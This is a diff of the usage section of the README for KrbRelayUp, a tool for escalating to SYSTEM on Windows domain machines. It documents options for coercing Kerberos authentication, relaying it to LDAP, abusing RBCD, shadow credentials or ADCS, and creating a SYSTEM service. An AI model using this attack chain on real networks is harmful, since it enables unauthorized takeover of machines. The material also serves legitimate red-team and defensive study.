@@ -28,34 +28,60 @@ KrbRelayUp.exe relay -d FQDN -cn COMPUTER [-c] [-cp PASSWORD | -ch NTHASH]
 ```plain
 KrbRelayUp - Relaying you to SYSTEM
 
-RELAY:
+FULL: Perform full attack chain. Options are identical to RELAY. Tool must be on disk.
+
+RELAY: First phase of the attack. Will Coerce Kerberos auth from local machine account, relay it to LDAP and create a control primitive over the local machine using RBCD or SHADOWCRED.
 Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]
 
-    -d  (--Domain)                   FQDN of domain.
-    -d  (--DomainController)         FQDN/IP of domain controller. (Optional)
-    -c  (--CreateNewComputerAccount)    Create new computer account for RBCD. Will use the current authenticated user.
-    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$ [if -c is enabled])
-    -cp (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])
-    -ch (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (Optional)
-    -p  (--Port)                     Port for Com Server (default=12345)
+    -m   (--Method)                   Abuse method to use in after a successful relay to LDAP <rbcd/shadowcred> (default=rbcd)
+    -p   (--Port)                     Port for Com Server (default=12345)
+    -cls (--Clsid)                    CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)
 
-SPAWN:
+    # RBCD Method:
+    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.
+    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)
+    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])
+
+    # SHADOWCRED Method:
+    -f   (--ForceShadowCred)          Clear the msDS-KeyCredentialLink attribute of the attacked computer account before adding our new shadow credentials. (Optional)
+
+    # ADCS Method:
+    -ca  (--CAEndpoint)               CA endpoint FQDN (default = same as DC)
+    -https                            Connect to CA endpoint over secure HTTPS instead of HTTP
+    -cet (--CertificateTemplate)      Certificate template to request for (default=Machine)
+
+
+SPAWN: Second phase of the attack. Will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.
 Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>
 
-    -d  (--Domain)                   FQDN of domain.
-    -d  (--DomainController)         FQDN/IP of domain controller. (Optional)
-    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$ [if -c is enabled])
-    -cp (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])
-    -ch (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (Optional)
-    -i  (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)
-    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)
-    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM
+    -m   (--Method)                   Abuse method used in RELAY phase <rbcd/shadowcred> (default=rbcd)
+    -i   (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)
+    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)
+    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)
 
-KRBSCM:
+    # RBCD Method:
+    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)
+    -cp  (--ComputerPassword)         Password of computer account for RBCD. (either -cp or -ch must be specified)
+    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)
+
+    # SHADOWCRED | ADCS Method:
+    -ce  (--Certificate)              Base64 encoded certificate or path to certificate file
+    -cep (--CertificatePassword)      Certificate password (if applicable)
+
+
+KRBSCM: Will use the currently loaded Kerberos Service Ticket to create a new service running as SYSTEM.
 Usage: KrbRelayUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>
 
     -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)
-    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM
+    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)
+
+
+General Options:
+    -d  (--Domain)                   FQDN of domain. (Optional)
+    -dc (--DomainController)         FQDN of domain controller. (Optional)
+    -ssl                             Use LDAP over SSL. (Optional)
+    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (enabled if using FULL mode)
+    -v  (--Verbose)                  Show verbose output. (Optional)
 ```
 
 ### Examples
